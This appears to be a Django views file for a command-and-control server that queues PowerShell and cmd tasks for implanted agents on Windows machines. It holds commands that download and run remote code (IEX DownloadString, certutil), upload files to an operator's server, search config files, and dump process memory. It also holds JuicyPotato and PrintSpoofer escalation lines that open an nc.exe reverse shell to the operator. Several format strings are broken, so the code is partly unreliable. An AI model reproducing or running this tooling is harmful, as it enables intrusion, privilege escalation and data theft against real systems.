import os
from blog.views import *
from blog.models import *
from django.http import HttpResponse , JsonResponse

# from rest_framework.views import APIView

current_path= os.path.dirname(os.path.abspath(__file__))

#we need to send request from GUI user with agent(hidden parm) and path(opt)
def DirectoryListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        path = request.POST['path']
        task = "ls {}".format(path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    # ls c:\users

def Applocker(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============AppLocker_Rules===============";Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections;echo "===============AppLocker Policy Test===============";Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    

def Download_IWR(request, url='', outpath=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = '[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";iwr -UseBasicParsing {} -OutFile {}'.format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadFileAsync(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFileAsync('{url}', '{outpath}')".format(url, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def DownloadString(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        task = "IEX (New-Object Net.WebClient).DownloadString('{url}')".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Download_SMB(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        url = request.POST['url']
        task = "copy \\{ip}:{port}\share\{fileName}".format(url)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def Download_FTP(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        ip = request.POST['ip']
        filename = request.POST['filename']
        outpath = request.POST['outpath']
        task = "(New-Object Net.WebClient).DownloadFile('ftp://{ip}/{filename}', '{outpath}')".format(ip,filename, outpath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def Invoke_fileUpload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        serverport = request.POST['serverport']
        ip = request.POST['ip']
        filepath = request.POST['filepath']
        task = "Invoke-FileUpload -Uri http://{ip}:{serverport}/upload -File {filepath}".format(ip,serverport,filepath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')


def FTP_fileUpload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        serverport = request.POST['serverport']
        ip = request.POST['ip']
        filepath = request.POST['filepath']
        outfile = request.POST['outfile']
        task = "(New-Object Net.WebClient).UploadFile('ftp://{ip}:{serverport}/{outfile}', '{filepath}')".format(ip,serverport,outfile,filepath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)

    else:
        return render(request, 'blog/listeners.html')

def open_pythonserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============Python Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} python3 -m http.server --directory {directory} {serverport};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_SMBserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============SMB Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} impacket-smbserver share -smb2support {directory} -port {port};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_FTPserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============FTP Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')    


def open_PY_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============Python Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m uploadserver --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def open_FTP_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system("echo '\n\n===============FTP Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory} --write;".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')




def env_var(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_environment_variables===============";Get-ChildItem Env:'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Phrase_finder(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        phrase = request.POST['phrase']
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============All_files_contain_"{}"===============";findstr /SIM /C:"{}" *.txt *ini *.cfg *.config *.xml'.format(phrase , phrase)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    # ls c:\users



def IPsWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Interface,IP_and_DNS_information===============";ipconfig /all; echo "===============arp table information===============";arp -a'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def logged_users(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============LoggedIn_users===============";query user'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Net_Connections(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Network_connections===============";netstat -ano'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Programs(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Installed_programs===============";Get-WmiObject -Class Win32_Product |  select Name, Version;echo ".`r`n`t`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

#######   
def processes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Running_processes===============";tasklist /svc;echo "++++++++++++++++++`r`n"'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def ScreenShot(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        f = open("{}".format(current_path+"screenshot"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def winuser_info(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Current_user===============";whoami;echo "===============User_Privileges==============="; whoami /priv;echo "===============User_group_information===============";whoami /groups'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Systeminfo(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============System_Info===============";systeminfo;echo "===============Get_Password_Policy_and_Other_Account_Information===============";net accounts;echo "===============All_system_users===============";net user;echo "===============All_system_groups===============";net localgroup'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
    


def UpdatesWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Patches_and_Updates===============";wmic qfe;Get-HotFix | ft -AutoSize'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

def UploadFileWindows(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        ip = request.POST['ip']
        file_path = request.POST['file_path']
        destination = request.POST['destination']
        task = 'certutil.exe -urlcache -split -f http://{}:8000/{} {}'.format(ip,file_path,destination)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
    
def WinDefStat(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Windows_Defender_Status===============";Get-MpComputerStatus'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def Named_pipes(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============List_named_pipes===============";(get-childitem \\\.\pipe\).FullName'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def Perm_pip(request , agent='',named_pip_name=''):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        task = 'echo "++++++++++++++++++`r`n`t`r`n===============Review permissions on a named pipe===============";cmd;accesschk.exe /accepteula \\.\Pipe\{} -v'.format(named_pip_name)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
       

def juicypotato (request):
    if request.method=='POST':
        myip = request.POST['myip']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        listenport = request.POST['listenport']    
        pathOfJuicyOnVictim = request.POST['pathOfJuicyOnVictim']
        task = '{} -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe {} {} -e cmd.exe" -t *'.format(pathOfJuicyOnVictim,myip,listenport)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    


def printspoofer (request):
    if request.method=='POST':
        myip = request.POST['myip']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        listenport = request.POST['listenport']    
        pathOfSpooferOnVictim = request.POST['pathOfSpooferOnVictim']
        task = '{} -c "c:\tools\nc.exe {} {} -e cmd"'.format(pathOfSpooferOnVictim,myip,listenport)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def procdump (request):
    if request.method=='POST':
        Args = request.POST['Args']
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        exeFile = request.POST['exeFile']    
        dmpFile = request.POST['dmpFile']
        task = 'procdump.exe {} {} {}'.format(Args,exeFile,dmpFile)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def tasklist (request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        
        task = 'tasklist'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def exploitParentProcess(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        system_pid = request.POST['system_pid']    
        path_to_execute = request.POST['path_to_execute']
        #give user note in GUI to transfer the PoCScript  first --> psgetsys.ps1
        task = "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1');[MyProcess]::CreateProcessFromParent({},'{}','')".format(system_pid,path_to_execute)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

        

